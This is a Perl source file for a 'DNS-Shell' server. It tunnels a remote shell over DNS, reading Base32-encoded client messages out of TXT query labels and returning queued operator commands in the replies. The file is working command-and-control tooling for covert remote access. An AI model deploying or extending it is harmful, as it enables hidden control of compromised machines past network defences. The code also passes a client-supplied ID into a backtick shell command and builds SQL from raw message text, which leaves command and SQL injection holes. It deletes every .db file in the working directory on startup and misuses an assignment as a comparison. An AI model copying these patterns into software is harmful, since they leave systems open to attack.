#!/usr/bin/perl
###############################
# To Do
# * Change client/server to utilize 253 - length($domain)
# * Update title window
#
###############################
# Known Bugs:
# * Can not change directories
# * Can not run apps in interactive mode. Client will hang
#
###############################
use warnings;
use strict;
use Net::DNS::Nameserver;
#use threads;
use MIME::Base32 qw ( RFC ); 
use DBI;

###############################
# Global Variables
###############################
my $debug;
my @clients;
#my %message_buffer;

###############################
# Parse User Arguments
###############################
foreach(@ARGV) {
	if ($_ eq "-d") {
		$debug = 1;
	}
}

###############################
# Subroutines
###############################
sub banner {
	print "Welcome to DNS-Shell Server.\n\n\n"
}

sub cleaner {
	chomp(my $err = `rm *.db`);
	if ($err) {
		debug("CLEANER", $err);
	}
}

sub client_shell {
	
}

sub debug {
	if ($debug) {
		print "$_[0] => $_[1]\n";
			}
}

sub reply_handler {
	my ($qname, $qclass, $qtype, $peerhost,$query,$conn) = @_;
	my ($rcode, @ans, @auth, @add);

	print "Received query from $peerhost to ". $conn->{sockhost}. "\n";
	#$query->print;

	if ($qtype eq "A" && $qname eq "foo.example.com" ) {
		my ($ttl, $rdata) = (3600, "10.1.2.3");
		my $rr = new Net::DNS::RR("$qname $ttl $qclass $qtype $rdata");
		push @ans, $rr;
		$rcode = "NOERROR";
	}elsif( $qtype = "TXT" ) {
		my @labels = split(/\./, $qname);
		
		my $client_msg = $labels[0];
                debug("CLIENT_MSG", $client_msg);

		my $part = $labels[1];
		my $parts = $labels[2];
		debug("PART", "$part of $parts");

		my $client_cmd = $labels[3];
		debug("CMD", $client_cmd);

		my $client_id = MIME::Base32::decode($labels[4]);
		debug("CLIENT_ID", $client_id);
		
		my $rmsg_encoded;
		
		# Check if new session
		my $client_exsist = 0;
		foreach my $client (@clients) {
			if ($client_id eq "$client"){
				$client_exsist = 1;
			}
		}
		if(!$client_exsist) {
			debug("New Client", $client_id);			
			push(@clients, $client_id);
			my $err = `sqlite3 $client_id.db "CREATE TABLE msg_queue (CLIENT_MSG_QUEUE varchar(4096), SERVER_MSG_QUEUE varchar(4096));"`;
			if ($err) {
				debug("CREATE $client_id.db msg_queue table", $err);
			}
			$err = `sqlite3 $client_id.db "CREATE TABLE msg_buff (SEQ INTEGER, PART varchar(100));"`;
			if ($err) {
				debug("CREATE $client_id.db msg_buff table", $err);
			}
			$err = `sqlite3 $client_id.db "CREATE TABLE cmd_queue (CLIENT_CMD varchar(10), SERVER_CMD varchar(10));"`;
                        if ($err) {
                                debug("CREATE $client_id.db msg_buff table", $err);
                        }

			# Set Null Values;
			my $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!;
                        my $sth = $dbh->prepare("INSERT INTO msg_queue('CLIENT_MSG_QUEUE', 'SERVER_MSG_QUEUE') VALUES('NULL', 'NULL')");
                        $sth->execute();
                        
			$sth = $dbh->prepare("INSERT INTO cmd_queue('CLIENT_CMD', 'SERVER_CMD') VALUES('NULL', 'NULL')");
                        $sth->execute();
			$sth->finish();
                        $dbh->disconnect();
		} else {
			debug("Exsisting Client", $client_id);
		}

		# insert part
		debug("CLIENT MSG_BUFF: $part", $client_msg);
                my $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!; 
                my $sth = $dbh->prepare("INSERT INTO msg_buff(SEQ, PART) VALUES('$part', '$client_msg')");
                $sth->execute();
                
		# check if we have all the parts
		$sth = $dbh->prepare("SELECT COUNT(SEQ) FROM msg_buff");
		$sth->execute();
		my @row = $sth->fetchrow_array();
                my $db_cnt = 0;
		if ($row[0]) {
                        debug("DB_CNT", $row[0]);
                        $db_cnt = $row[0];
                }
                $sth->finish();
                $dbh->disconnect();

		if ($db_cnt eq $parts) {
			
			#msg complete
			# Assemble msg and put into queue
			$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!;
                        $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='$client_msg'");	
			my $reassembled_message_encoded = '';
			for (my $seq = 0; $seq < $parts; $seq++) {
				$sth = $dbh->prepare("SELECT PART FROM msg_buff WHERE SEQ = '$seq'");
				$sth->execute();
                        	
				my @row = $sth->fetchrow_array();
                        	if ($row[0]) {
                                	debug("REASSEMBLY", $row[0]);
                                	$reassembled_message_encoded .= $row[0];
                        	} else {
					debug("REASSEMBLY", "Missing part: $seq");
				}
			}
			debug("REASSEMBLED MESSAGE ENCODED", $reassembled_message_encoded);			
			
                        $sth->finish();
                        $dbh->disconnect();	

			#die;
			# Update CMD
			debug("CMD", "UPDATE");
                        $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!;
                        $sth = $dbh->prepare("UPDATE cmd_queue SET CLIENT_CMD='$client_cmd'");
                        $sth->execute();
                        $sth->finish();
                        $dbh->disconnect();

			# client msg queue
	                debug("CLIENT MESSAGE QUEUE", "UPDATE");
        	        $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!;
	                $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='$reassembled_message_encoded'");
			$sth->execute();
                	$sth->finish();
	                $dbh->disconnect();

			# Remove message from msg_buff
                        debug("CLIENT MSG_BUFF", "CLEAR");
                        $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!;
                        $sth = $dbh->prepare("DELETE FROM msg_buff");
                        $sth->execute();
                        $sth->finish();
                        $dbh->disconnect();

			# Get SRV Command
                        debug("CMD_QUEUE", "READ");
                        $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
                        $sth = $dbh->prepare("SELECT SERVER_CMD FROM cmd_queue");
                        $sth->execute();

                        my @row = $sth->fetchrow_array();
                        if ($row[0]) {
                                debug("SRV CMD MSG", $row[0]);
                                $rmsg_encoded = $row[0];
                        }
                        $sth->finish();
                        $dbh->disconnect();

			# Pop srv cmd off the stack
                        debug("COMMAND MESSAGE QUEUE", "CLEARED");
                        $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
                        $sth = $dbh->prepare("UPDATE cmd_queue SET SERVER_CMD = 'NULL'");
                        $sth->execute();
                        $sth->finish();
                        $dbh->disconnect();

	                # Get SRV Responce
        	        debug("SERVER MESSAGE_QUEUE", "READ");
                	$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
	                $sth = $dbh->prepare("SELECT SERVER_MSG_QUEUE FROM msg_queue");
        	        $sth->execute();
	
        	        #$rmsg_encoded = MIME::Base32::encode("NULL");
                	@row = $sth->fetchrow_array();
	                if ($row[0]) {
        	                debug("ENCODING SRV MSG", $row[0]);
                	        $rmsg_encoded = "$rmsg_encoded\." . MIME::Base32::encode($row[0]);
	                }
        	        $sth->finish();
                	$dbh->disconnect();

	                # Pop off the stack
        	        debug("SERVER MESSAGE QUEUE", "CLEARED");
                	$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
 	                $sth = $dbh->prepare("UPDATE msg_queue SET SERVER_MSG_QUEUE = 'NULL'");
        	        $sth->execute();
                	$sth->finish();
	                $dbh->disconnect();

		} else {
			#msg incomplete
			$rmsg_encoded = "NULL\." . MIME::Base32::encode("NULL");		
		}
		
		my ($ttl, $rdata) = (1, $rmsg_encoded);
		my $rr = new Net::DNS::RR("$qname $ttl $qclass $qtype $rdata");
		push @ans, $rr;
		$rcode = "NOERROR";
	}elsif( $qname eq "foo.example.com" ) {
		$rcode = "NOERROR";
	}else{
		$rcode = "NXDOMAIN";
	}

	# mark the answer as authoritive (by setting the 'aa' flag
	return ($rcode, \@ans, \@auth, \@add, { aa => 1 });
}

###############################
# Main
###############################

# print banner
banner();
cleaner();
my $ns = new Net::DNS::Nameserver(
LocalPort    => 53,
ReplyHandler => \&reply_handler,
Verbose	     => 0
) || die "couldn't create nameserver object\n";

$ns->main_loop;
